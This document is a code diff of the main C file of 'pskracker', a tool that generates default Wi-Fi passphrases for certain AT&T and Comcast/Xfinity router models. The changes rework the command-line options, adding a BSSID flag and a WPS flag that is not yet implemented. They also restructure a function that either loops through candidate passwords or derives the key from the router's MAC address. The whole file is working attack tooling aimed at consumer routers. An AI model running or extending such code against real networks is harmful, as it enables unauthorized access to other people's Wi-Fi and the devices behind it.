@@ -32,14 +32,14 @@
 #include "xfinity.c"
 #include "tools.c"
 
-static const char *option_string = "t:e:s:m:h";
+static const char *option_string = "t:b:s:Wh";
 static const struct option long_options[] = {
-		{ "target",     required_argument, 0, 't' },
-		{ "encryption", required_argument, 0, 'e' },
-		{ "serial",     required_argument, 0, 's' },
-		{ "mac",        required_argument, 0, 'm' },
-		{ "help",       no_argument,       0, 'h' },
-		{ 0,            0,                 0,  0  }
+		{ "target",     required_argument,	0, 't' },
+		{ "bssid", 		required_argument,	0, 'b' },
+		{ "wps", 		no_argument,		0, 'W' },
+		{ "serial",     required_argument,	0, 's' },
+		{ "help",       no_argument,		0, 'h' },
+		{ 0,            0,					0,  0  }
 };
 
 void usage_err() {
@@ -52,103 +52,81 @@ void usage_err() {
 		"\n"
 		"Required Arguments:\n"
 		"\n"
-		"    -t, --target       : Target model number\n"
-		"    -e, --encryption   : Security/encryption type\n"
+		"   -t, --target		: Target model number\n"
 		"\n"
 		"Optional Arguments:\n"
 		"\n"
-		"    -s, --serial       : Serial number\n"
-		"    -m, --mac          : Mac address\n"
+		"	-b, --bssid			: BSSID of target\n"
+		"	-W, --wps			: Output possible WPS pin(s) only\n"
+		"	-s, --serial		: Serial number\n"
+		"	-h, --help			: Display help/usage\n"
 		"\n"
 		"Example:\n"
 		"\n"
-		"    pskracker -t <target> -e <security/encryption mode> -s <serial number> -m <mac address>\n"
+		"	pskracker -t <target model> -b <bssid> -s <serial number>\n"
 		"\n"
 	);
 	exit(1);
 }
 
-// target selection
-enum model {nvg589 = 0x00, nvg599 = 0x01, dpc3939 = 0x02, dpc3941 = 0x03, tg1682g = 0x04, ENDMODEL = END};
-enum encryption {wpa = 0x00, wpa2 = 0x01, wps = 0x02, ENDENC = 0x03};
-
-enum model getModel(char *inModel) {
-	static const char *models[] = {"nvg589", "nvg599", "dpc3939", "dpc3941", "tg1682g"};
-	uint8_t i;
-	for(i = 0; i < ENDMODEL; ++i) {
-		if(!strcmp(models[i], inModel)) {
-			return i;
+void bruteforce(char *target, uint8_t mode, uint8_t *pMac) {
+	/* WPA */
+	if(mode == 0) {
+		/* ATT NVG589 */
+		if(!strcmp("nvg589", target)) {
+			int i;
+			unsigned char psk[ATT_NVG5XX_PSK_LEN];
+			for (i = 0; i < INT_MAX; i++) {
+				genpass589(i, psk);
+				printf("%s\n", psk);
+			}
+		}
+		/* ATT NVG599 */
+		else if(!strcmp("nvg599", target)) {
+			int i;
+			unsigned char psk[ATT_NVG5XX_PSK_LEN];
+			for (i = 0; i < INT_MAX; i++) {
+				genpass599(i, psk);
+				printf("%s\n", psk);
+			}
+		}
+		/* Comcast/Xfinity Home Security DPC3939, DPC3491, TG1682G */
+		else if (!strcmp("dpc3939", target) || !strcmp("dpc3941", target) || !strcmp("tg1682g", target)) {
+			if(pMac != NULL) {
+				printf("PSK: %s\n",genpassXHS(pMac));
+			}
+			else {
+				printf("Specify target bssid: -b <bssid>\n");
+				exit(1);
+			}
 		}
 	}
-	return ENDMODEL;
-}
-
-enum encryption getEncryption(char *inEnc) {
-	static const char *enctypes[] = {"wpa", "wpa2", "wps"};
-	uint8_t i;
-	for(i = 0; i < ENDENC; ++i) {
-		if(!strcmp(enctypes[i], inEnc)) {
-			return i;
-		}
+	/* WPS */
+	else if (mode == 1){
+		// nothing implemented yet
 	}
-	return ENDENC;
-}
-
-void bruteforce(uint8_t model, uint8_t enc, uint8_t *mac) {
-
-	if(model == 0x00) {
-		int32_t i;
-		unsigned char psk[ATT_NVG5XX_PSK_LEN];
-		for (i = 0; i < INT_MAX; i++) {
-			genpass589(i, psk);
-			printf("%s\n", psk);
-		}
-	}
-	else if(model == 0x01) {
-		int32_t i;
-		unsigned char psk[ATT_NVG5XX_PSK_LEN];
-		for (i = 0; i < INT_MAX; i++) {
-			genpass599(i, psk);
-			printf("%s\n", psk);
-		}
-	}
-	else if((model == 0x02 || model == 0x03 || model == 0x04) && (enc == 0x00 || enc == 0x01)) {
-		if(mac == NULL) {
-			printf("Invalid MAC address\n");
-			exit(1);
-		}
-		printf("PSK: %s\n", genpassXHS(mac));
+	/* Neither, exit */
+	else {
+		usage_err();
 	}
 }
 
 int main(int argc, char **argv) {
-	uint8_t mac[6], *pMac = 0;
-	uint8_t model;
-	uint8_t enc;
+	uint8_t mac[6], mode = 255, *pMac = 0;
+	char *target;
 
 	int opt = 0;
 	int long_index = 0;
 	opt = getopt_long(argc, argv, option_string, long_options, &long_index);
 	while (opt != -1) {
-		switch (opt) {
+		switch (opt) { // default setting for variable options is 0
 
-		case 't': // target model number selection
-			if (getModel(optarg) != END) {
-				model = getModel(optarg);
-			} else {
-				usage_err();
-			}
+		case 't':
+			mode = 0; // set WPA (bruteforce())
+			target = optarg;
 			break;
 
-		case 'e': // security/encryption mode selection
-			if (getEncryption(optarg) != 0x03) {
-				enc = getEncryption(optarg);
-			} else {
-				usage_err();
-			}
-			break;
-
-		case 'm': // mac address selection
+		case 'b':
 			if (hex_string_to_byte_array(optarg, mac, BSSID_LEN)) {
 				printf("Invalid MAC Address\n");
 				exit(2);
@@ -156,17 +134,22 @@ int main(int argc, char **argv) {
 			pMac = mac;
 			break;
 
+		case 'W':
+			mode = 1; // set WPS (bruteforce())
+			break;
+
+		case 's':
+			break;
+
 		case 'h': // display usage menu
 			usage_err();
 			break;
 
 		default:
-			usage_err();
 			break;
 		}
 		opt = getopt_long(argc, argv, option_string, long_options, &long_index);
 	}
-	printf("Model: %d \tEncryption: %d \tMac Address: %s\n", model, enc, pMac);
-	bruteforce(model, enc, pMac);
+	bruteforce(target, mode, pMac);
 	return 0;
 }
